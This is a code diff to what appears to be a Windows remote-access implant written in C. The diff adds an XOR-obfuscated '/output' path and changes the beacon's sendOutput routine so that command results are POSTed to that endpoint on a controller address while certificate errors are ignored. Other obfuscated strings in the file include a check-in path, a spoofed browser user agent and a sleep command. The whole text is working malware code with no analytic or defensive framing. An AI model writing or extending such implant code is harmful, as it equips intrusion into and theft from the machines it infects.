@@ -117,6 +117,7 @@ char ip[] = {0x64, 0x65, 0x7B, 0x64, 0x65, 0x7B, 0x64, 0x65, 0x7B, 0x64, 0x00};
 char brow[]     = {0x18, 0x3A, 0x2F, 0x3C, 0x39, 0x39, 0x34, 0x7A, 0x60, 0x7B, 0x65, 0x00};
 char check[]    = {0x7A, 0x36, 0x3D, 0x30, 0x36, 0x3E, 0x3C, 0x3B, 0x00};
 char cmd_sleep[] = {0x26, 0x39, 0x30, 0x30, 0x25, 0x00};
+char out_path[] = {0x7A, 0x3A, 0x20, 0x21, 0x25, 0x20, 0x21, 0x00};
 
 char* getCompname() {
     DWORD dwSize = MAX_PATH;
@@ -142,6 +143,7 @@ int beacon() {
     xorString(brow,      0x55, sizeof(brow)      - 1);
     xorString(check,     0x55, sizeof(check)     - 1);
     xorString(cmd_sleep, 0x55, sizeof(cmd_sleep) - 1);
+    xorString(out_path,  0x55, sizeof(out_path)  - 1);
 
     memset(response, 0, sizeof(response));
 
@@ -191,6 +193,7 @@ int beacon() {
     xorString(brow,      0x55, sizeof(brow)      - 1);
     xorString(check,     0x55, sizeof(check)     - 1);
     xorString(cmd_sleep, 0x55, sizeof(cmd_sleep) - 1);
+    xorString(out_path,  0x55, sizeof(out_path)  - 1);
 
     return 0;
 }
@@ -227,7 +230,7 @@ void sendOutput(char* output) {
         return;
     }
 
-    hReqOut = HttpOpenRequest(hConOut, "POST", check, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
+    hReqOut = HttpOpenRequest(hConOut, "POST", out_path, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
     if (hReqOut == NULL) {
         printf("HttpOpenRequest failed: %lu\n", GetLastError());
         return;
